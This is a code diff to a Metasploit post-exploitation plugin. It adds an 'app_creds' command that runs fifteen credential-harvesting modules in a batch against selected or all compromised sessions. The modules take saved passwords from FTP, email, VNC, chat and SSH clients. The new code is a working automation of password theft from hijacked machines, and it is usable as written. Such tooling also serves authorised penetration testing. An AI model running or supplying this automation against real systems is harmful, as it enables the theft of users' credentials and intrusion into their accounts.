@@ -34,16 +34,80 @@ class Plugin::Postauto < Msf::Plugin
 				'multi_post_rc'      => "Run resource file with post modules and options against specified sessions.",
 				'multi_meter_cmd'    => "Run a Meterpreter Console Command against specified sessions.",
 				'multi_meter_cmd_rc' => "Run resource file with Meterpreter Console Commands against specified sessions.",
-				"sys_creds"          => "Run system password collection modules against specified sessions."
+				"sys_creds"          => "Run system password collection modules against specified sessions.",
+				"app_creds"          => "Run application password collection modules against specified sessions."
 
 			}
+		end
+
+		# browser_creds Command
+		#-------------------------------------------------------------------------------------------
+		def cmd_app_creds(*args)
+			opts = Rex::Parser::Arguments.new(
+				"-s"   => [ true,	"Sessions to run modules against. Example <all> or <1,2,3,4>"],
+				"-h"   => [ false,  "Command Help"]
+			)
+
+			cred_mods = [
+				{"mod" => "windows/gather/enum_coreftp_pwds", "opt" => nil},
+				{"mod" => "windows/gather/enum_flashfxp_pwd", "opt" => nil},
+				{"mod" => "windows/gather/enum_idm_pwds", "opt" => nil},
+				{"mod" => "windows/gather/enum_imail_pwds", "opt" => nil},
+				{"mod" => "windows/gather/enum_mremote_pwds", "opt" => nil},
+				{"mod" => "windows/gather/enum_nimbuzz_pwds", "opt" => nil},
+				{"mod" => "windows/gather/enum_outlook_pwds", "opt" => nil},
+				{"mod" => "windows/gather/enum_smartftp_pwd", "opt" => nil},
+				{"mod" => "windows/gather/enum_trillian_pwds", "opt" => nil},
+				{"mod" => "windows/gather/enum_vnc_pw", "opt" => nil},
+				{"mod" => "windows/gather/enum_winscp_pwds", "opt" => nil},
+				{"mod" => "windows/gather/wsftp_client_creds", "opt" => nil},
+				{"mod" => "multi/gather/pidgin_cred", "opt" => nil},
+				{"mod" => "multi/gather/filezilla_client_cred", "opt" => nil},
+				{"mod" => "multi/gather/ssh_creds", "opt" => nil},
+			]
+
+			# Parse options
+			sessions = nil
+			opts.parse(args) do |opt, idx, val|
+				case opt
+				when "-s"
+					sessions = val
+				end
+			end
+
+			cred_mods.each do |p|
+				m = framework.post.create(p["mod"])
+
+				# Set Sessions to be processed
+				if sessions =~ /all/i
+					session_list = m.compatible_sessions
+				else
+					session_list = sessions.split(",")
+				end
+				session_list.each do |s|
+					if m.session_compatible?(s.to_i)
+						m.datastore['SESSION'] = s.to_i
+						if p['opt']
+							opt_pair = p['opt'].split("=",2)
+							m.datastore[opt_pair[0]] = opt_pair[1]
+						end
+						m.options.validate(m.datastore)
+						print_status("")
+						print_status("Running #{p['mod']} against #{s}")
+						m.run_simple(
+							'LocalInput'    => driver.input,
+							'LocalOutput'    => driver.output
+						)
+					end
+				end
+			end
 		end
 
 		# sys_creds Command
 		#-------------------------------------------------------------------------------------------
 		def cmd_sys_creds(*args)
 			opts = Rex::Parser::Arguments.new(
-				"-s"   => [ true,	"Sessions to run module against. Example <all> or <1,2,3,4>"],
+				"-s"   => [ true,	"Sessions to run modules against. Example <all> or <1,2,3,4>"],
 				"-h"   => [ false,  "Command Help"]
 			)
 
@@ -91,6 +155,7 @@ class Plugin::Postauto < Msf::Plugin
 				end
 			end
 		end
+
 		# Multi_post Command
 		#-------------------------------------------------------------------------------------------
 		def cmd_multi_post(*args)
